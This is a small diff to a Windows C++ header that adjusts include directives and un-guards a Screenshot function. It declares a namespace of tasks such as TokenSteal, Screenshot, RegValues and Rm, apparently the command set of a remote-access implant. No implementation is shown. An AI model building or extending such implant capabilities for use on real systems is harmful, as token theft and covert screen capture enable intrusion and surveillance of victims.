@@ -8,12 +8,10 @@
 #include <winreg.h>
 #include <winternl.h>
 #include <dbghelp.h>
-
-#ifndef IS_DLL
 #include <gdiplus.h>
-#endif
-
 #include <iphlpapi.h>
+#include <psapi.h>
+#include <shlwapi.h>
 #include <strsafe.h>
 #include <synchapi.h>
 #include <tlhelp32.h>
@@ -90,9 +88,7 @@ namespace Task
     std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecurse);
     std::wstring Rm(const std::wstring& wFile);
     std::wstring Rmdir(const std::wstring& wDir);
-    #ifndef IS_DLL
     std::wstring Screenshot(HINSTANCE hInstance, INT nCmdShow);
-    #endif
     std::wstring Sleep(const std::wstring& wSleepTime, INT &nSleep);
     std::wstring TokenRevert();
     std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName);
